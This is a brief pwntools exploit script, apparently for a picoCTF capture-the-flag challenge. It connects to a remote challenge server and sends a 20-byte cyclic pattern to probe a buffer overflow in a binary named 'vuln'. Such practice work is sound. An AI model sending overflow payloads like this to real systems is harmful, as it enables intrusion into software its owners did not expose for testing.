#!/usr/bin/python3

from pwn import *

elf = ELF('vuln')

#io = process('./vuln')
io = remote('saturn.picoctf.net' ,64991)

payload = cyclic(20) 

io.sendline(payload)
io.interactive()
